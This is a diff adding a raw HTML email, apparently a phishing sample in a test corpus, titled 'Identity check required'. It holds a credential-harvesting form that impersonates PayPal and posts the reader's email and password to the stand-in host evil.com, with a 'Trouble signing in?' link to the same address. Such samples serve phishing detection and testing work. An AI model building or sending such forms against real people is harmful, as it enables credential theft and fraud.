@@ -1,0 +1,36 @@
+From: Identity Center <identity@phishing-test.com>
+To: security-review@victim.example
+Date: Mon, 10 Aug 2026 13:22:00 +0000
+Message-ID: <msg-1844-phishing_html-08@corpus.phishing-test.com>
+Subject: Identity check required
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<!doctype html>
+<html lang=3D"en">
+<head>
+  <meta charset=3D"utf-8">
+  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1">
+  <title>Identity verification</title>
+  <style>
+    body { margin: 0; background: #f4f6f8; color: #263238; font-family: Arial=
+, sans-serif; }
+    .card { max-width: 620px; margin: 28px auto; padding: 30px; background: #=
+fff; border: 1px solid #dde3e8; border-radius: 8px; }
+    .button { display: inline-block; padding: 12px 22px; color: #fff !importa=
+nt; background: #1769aa; border-radius: 4px; text-decoration: none; }
+    .muted { color: #6b7785; font-size: 12px; }
+   =20
+  </style>
+</head>
+<body>
+  <div class=3D"card">
+    <h1>Verify your identity</h1><form method=3D"post" action=3D"https://evil=
+.com/paypal/login"><label>Email <input name=3D"email" type=3D"email"></label>=
+<br><label>Password <input name=3D"password" type=3D"password"></label><br><b=
+utton type=3D"submit">Verify</button></form><p class=3D"muted"><a href=3D"htt=
+ps://evil.com/paypal/login">Trouble signing in?</a></p>
+  </div>
+</body>
+</html>
